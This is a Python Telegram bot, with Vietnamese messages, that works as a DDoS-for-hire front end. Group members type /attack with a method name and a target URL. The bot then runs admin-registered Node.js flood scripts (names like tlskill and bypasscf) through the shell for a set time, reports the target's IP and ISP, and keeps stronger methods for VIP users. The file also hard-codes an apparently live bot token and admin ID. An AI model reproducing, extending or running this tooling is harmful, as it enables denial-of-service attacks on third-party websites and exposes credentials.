import time, json, asyncio, socket, requests, os
from urllib import parse
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler
from pytz import timezone
from html import escape

TOKEN, ADMIN_ID, GROUP_ID, VIP_USERS_FILE, METHODS_FILE, user_processes = '8153292874:AAFOMh-8QvEs2DJSqbl8NZzVMr8RWlc3egg', 283882033, -1002434530321, 'vip_users.json', 'justin.json', {}
BOT_ACTIVE = True

def load_json(file): return json.load(open(file, 'r')) if os.path.exists(file) else (save_json(file, {}) or {})
def save_json(file, data): json.dump(data, open(file, 'w'), indent=4)
def get_vietnam_time(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')
def get_ip_and_isp(url): 
    try: ip = socket.gethostbyname(parse.urlsplit(url).netloc); response = requests.get(f"http://ip-api.com/json/{ip}")
    except: return None, None
    return ip, response.json() if response.ok else None
def is_valid_url(url): return url.startswith("http://") or url.startswith("https://")

async def pkill_handler(update, context): 
    if not BOT_ACTIVE: return await update.message.reply_text("Bot đã bị tắt. Không thể thực hiện lệnh. ⛔")
    if update.message.from_user.id != ADMIN_ID and update.message.from_user.id not in load_json(VIP_USERS_FILE): 
        return await update.message.reply_text("Bạn không có quyền. ⛔")
    for cmd in ["pkill -9 -f flood", "pkill -9 -f tlskill", "pkill -9 -f bypasscf", "pkill -9 -f killercf", "pkill -9 -f ctccf", "pkill -9 -f floodctc"]:
        process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
        if stderr: return await update.message.reply_text("Đã xảy ra lỗi ERROR ❌.")
    await update.message.reply_text("Đã KILL tất cả tiến trình đang chạy SUCCESSFULLY ✅.")

async def command_handler(update, context, handler_func, min_args, help_text): 
    if not BOT_ACTIVE and update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bot đã bị tắt. 🚫 Admin có thể thực hiện lệnh này.")
    if len(context.args) < min_args: return await update.message.reply_text(help_text)
    await handler_func(update, context)

async def add_method(update, context, methods_data):
    if not BOT_ACTIVE or update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền. ⛔")
    if len(context.args) < 2: return await update.message.reply_text("Cách sử dụng: /add <method_name> <url> timeset <time> [vip/member]")
    method_name, url, attack_time = context.args[0], context.args[1], 60
    if 'timeset' in context.args: 
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await update.message.reply_text("Tham số thời gian không hợp lệ.")
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    command = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join([arg for arg in context.args[2:] if arg not in ['[vip]', '[member]', 'timeset']])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time, 'visibility': visibility}
    save_json(METHODS_FILE, methods_data)
    await update.message.reply_text(f"Phương thức {method_name} đã được thêm với quyền {visibility}.")

async def delete_method(update, context, methods_data):
    if not BOT_ACTIVE or update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền. ⛔")
    if len(context.args) < 1: return await update.message.reply_text("Cách sử dụng: /del <method_name>")
    method_name = context.args[0]
    if method_name not in methods_data: return await update.message.reply_text(f"Không tìm thấy phương thức {method_name}.")
    del methods_data[method_name]
    save_json(METHODS_FILE, methods_data)
    await update.message.reply_text(f"Phương thức {method_name} đã bị xóa.")

async def attack_method(update, context, methods_data, vip_users): 
    if not BOT_ACTIVE and update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bot đã bị tắt 🚫. Admin có thể thực hiện lệnh này.")
    user_id, chat_id = update.message.from_user.id, update.message.chat.id
    if chat_id != GROUP_ID: return await update.message.reply_text("Phá gì đó? ⛔ CONTACT OWNER [@justintv90 👑]")
    if user_id in user_processes and user_processes[user_id].returncode is None: return await update.message.reply_text("Bạn đang có tiến trình khác đang chạy 🚫 vui lòng chờ hoàn tất.")
    if len(context.args) < 2: return await update.message.reply_text("Cách sử dụng: /attack [methods] https://trangweb.com")
    method_name, url = context.args[0], context.args[1]
    if not is_valid_url(url): return await update.message.reply_text("URL không hợp lệ. nhập đầy đủ http:// https://")
    if method_name not in methods_data: return await update.message.reply_text("Không tìm thấy phương thức. ❌")
    method = methods_data[method_name]
    if method['visibility'] == 'VIP' and user_id != ADMIN_ID and user_id not in vip_users: 
        return await update.message.reply_text("Bạn không có quyền sử dụng phương thức VIP 🔒 CONTACT OWNER [@justintv90 👑]")
    attack_time = method['time']
    if user_id == ADMIN_ID and len(context.args) > 2: 
        try: attack_time = int(context.args[2])
        except: return await update.message.reply_text("Thời gian không hợp lệ. ❌")
    ip, isp_info = get_ip_and_isp(url)
    if not ip: return await update.message.reply_text("Không thể lấy IP kiểm tra lại đường dẫn URL ❌")
    command = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    await update.message.reply_text(f"Sent Successfully: {method_name}.\nRequested By: 👉 {update.message.from_user.username}\nINFO IPS WEBSITE : 👇\n<pre>{escape(isp_info_text)}</pre>\nPROCESS TIME: {attack_time}s\nSTART TIME: {get_vietnam_time()}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 KIỂM TRA TÌNH TRẠNG WEBSITE", url=f"https://check-host.net/check-http?host={url}")]]))
    asyncio.create_task(execute_attack(command, update, method_name, time.time(), attack_time))

async def execute_attack(command, update, method_name, start_time, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[update.message.from_user.id] = process
        stdout, stderr = await process.communicate()
        status, error = ("Hoàn Thành ✅", None) if not stderr else ("ERROR ❌", stderr.decode())
    except Exception as e:
        status, error = "ERROR ❌", str(e)

    elapsed_time = round(time.time() - start_time, 2)
    attack_info = {
        "method_name": method_name,
        "username": update.message.from_user.username,
        "start_time": datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'),
        "end_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "elapsed_time": elapsed_time,
        "attack_status": status,
        "error": error or "Successfully"
    }
    await update.message.reply_text(f"Tiến trình đã hoàn tất! Thời gian: {elapsed_time}s.\n\nChi tiết: 👇\n<pre>{escape(json.dumps(attack_info, indent=2, ensure_ascii=False))}</pre>", parse_mode='HTML')

async def list_methods(update, methods_data):
    if not BOT_ACTIVE: return await update.message.reply_text("Bot đã bị tắt. 🚫")
    if not methods_data: return await update.message.reply_text("Không có phương thức nào.")
    await update.message.reply_text(f"Phương thức có sẵn:\n" + "\n".join([f"{name} ({data['visibility']}): {data['time']}s" for name, data in methods_data.items()]))

async def manage_vip_user(update, context, vip_users, action):
    if not BOT_ACTIVE or update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền. ⛔")
    if len(context.args) < 1: return await update.message.reply_text("Cách sử dụng: /vipuser <uid> để thêm hoặc /delvip <uid> để xóa")
    user_id = int(context.args[0])
    if action == "add" and user_id not in vip_users: 
        vip_users.add(user_id); save_json(VIP_USERS_FILE, list(vip_users)); await update.message.reply_text(f"Người dùng {user_id} đã được thêm vào VIP. ✅")
    elif action == "remove" and user_id in vip_users: 
        vip_users.remove(user_id); save_json(VIP_USERS_FILE, list(vip_users)); await update.message.reply_text(f"Người dùng {user_id} đã bị xóa khỏi VIP.")
    else: await update.message.reply_text(f"Người dùng {user_id} đã tồn tại hoặc không tồn tại trong danh sách VIP.")

async def help_message(update, context): 
    await update.message.reply_text(
    "Owner: [@justintv90 👑]\n"
    "/attack [Tên Methods] https://website-cần-tấn-công.\n"
	"/methods: [Methods hiện có sẵn]\n"

)

async def bot_on(update, context):
    global BOT_ACTIVE
    if update.message.from_user.id == ADMIN_ID: BOT_ACTIVE = True; await update.message.reply_text("Bot đã được bật. 🟢")

async def bot_off(update, context):
    global BOT_ACTIVE
    if update.message.from_user.id == ADMIN_ID: BOT_ACTIVE = False; await update.message.reply_text("Bot đã được tắt. 🔴")

    
methods_data = load_json(METHODS_FILE)
vip_users = set(load_json(VIP_USERS_FILE))
app = ApplicationBuilder().token(TOKEN).build()
app.add_handlers([
    CommandHandler("add", lambda u, c: command_handler(u, c, lambda u, c: add_method(u, c, methods_data), 2, "Sử dụng: /add <method> <url> timeset <time> [vip/member]")),
    CommandHandler("del", lambda u, c: command_handler(u, c, lambda u, c: delete_method(u, c, methods_data), 1, "Sử dụng: /del <method>")),
    CommandHandler("attack", lambda u, c: command_handler(u, c, lambda u, c: attack_method(u, c, methods_data, vip_users), 2, "Sử dụng: /attack <Methods> https://trangwebcuaban.com")),
    CommandHandler("methods", lambda u, c: command_handler(u, c, lambda u, c: list_methods(u, methods_data), 0, "")),
    CommandHandler("vipuser", lambda u, c: command_handler(u, c, lambda u, c: manage_vip_user(u, c, vip_users, "add"), 1, "Sử dụng: /vipuser <uid>")),
    CommandHandler("delvip", lambda u, c: command_handler(u, c, lambda u, c: manage_vip_user(u, c, vip_users, "remove"), 1, "Sử dụng: /delvip <uid>")),
    CommandHandler("pkill", pkill_handler), CommandHandler("help", help_message), CommandHandler("on", bot_on), CommandHandler("off", bot_off)
])
app.run_polling()
